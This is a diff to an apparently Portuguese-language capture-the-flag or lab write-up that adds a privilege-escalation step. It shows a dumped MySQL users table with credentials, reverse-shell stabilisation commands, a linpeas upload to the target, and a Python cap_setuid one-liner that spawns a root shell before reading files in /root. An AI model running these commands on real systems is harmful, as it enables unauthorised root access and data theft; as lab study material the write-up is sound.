@@ -71,7 +71,6 @@ o bypass no filtro é bem sucedido e a vuln command injection foi encontrada ->
 : stty raw -echo; fg
 
 
-
 *xterm para funcionar corretamente* ->
 : export TERM=xterm
 
@@ -102,3 +101,14 @@ mysql> select * from users;
 | 13 | jon      | jonadmin         |
 +----+----------+------------------+
 #+end_src
+
+Porém ainda é necessário pegar o root do sistema, o iftop está limitado com a opção de subshell desativada.
+
+Importei o linpeas from meu host para o /tmp da máquina target, e executei ele.
+
+Após encontrar o python3.9 com a cap_setuid=ep
+: /usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+ROot
+: cat /root/private.txt
+: cat /root/domains.txt
